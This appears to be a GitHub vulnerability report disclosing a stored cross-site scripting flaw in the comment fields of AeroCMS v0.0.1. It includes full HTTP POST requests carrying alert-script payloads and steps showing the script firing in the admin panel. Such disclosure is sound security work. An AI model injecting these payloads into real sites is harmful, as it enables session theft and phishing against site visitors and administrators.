### **[rahadchowdhury](/rahadchowdhury)** commented [Mar 13, 2023](#issue-1622189493)

| **Description:** I found Stored Cross site scripting (XSS) vulnerability in your AeroCMS (v0.0.1) post comments section "Author" and "Content" field. When I use malicious code or use any xss payload then the browser give me result. Because a browser can not know if the script should be trusted or not.  **CMS Version:** v0.0.1  **Affected URL:** <http://127.0.0.1/AeroCMS/post.php>  **Steps to Reproduce:**   1. At first open any post. 2. then fill up comments section and your request data will be   POST /AeroCMS/post.php?p\_id=1 HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 86 Origin: <http://127.0.0.1> Cookie: PHPSESSID=qtj8dhp0jub18i2agkfm4bf5ea Connection: close  comment\_author=test&comment\_email=test@test.com&comment\_content=test&create\_comment=   3. "comment\_author" and "comment\_content" parameters are vulnerable. Let's try to use any XSS payload in "comment\_author" and "comment\_content" parameters and your request data will be   POST /AeroCMS/post.php?p\_id=1 HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 86 Origin: <http://127.0.0.1> Cookie: PHPSESSID=qtj8dhp0jub18i2agkfm4bf5ea Connection: close  comment\_author=test"><script>alert(111)</script>&comment\_email=test@test.com&comment\_content=test"><script>alert('XSS')</script>&create\_comment=  [1](https://user-images.githubusercontent.com/41516016/224819849-1c76ba82-628c-48af-a375-4ef9c462f571.png) [2](https://user-images.githubusercontent.com/41516016/224819883-955dfc9e-c60c-40f9-99c7-7be04994ce0b.png)   4. Now login admin panel and go to "Comments" Menu 5. You will see XSS pop up (If admin approve comment so XSS pop up execute in post section).   [3](https://user-images.githubusercontent.com/41516016/224819938-eb12ad0d-5673-4f93-8cb7-1ab660c44654.png) [4](https://user-images.githubusercontent.com/41516016/224819969-9266e608-623e-4754-8fce-380160241fd7.png) [5](https://user-images.githubusercontent.com/41516016/224819980-aefba998-7ee3-44d7-94cd-58a517d20554.png)  **Proof of Concept:** You can see the Proof of Concept. which I've attached screenshots and video to confirm the vulnerability.    Stored.XSS.on.AeroCMS.mp4     **Impact:** Attackers can make use of this to conduct attacks like phishing, steal sessions etc.  Let me know if any further info is required.
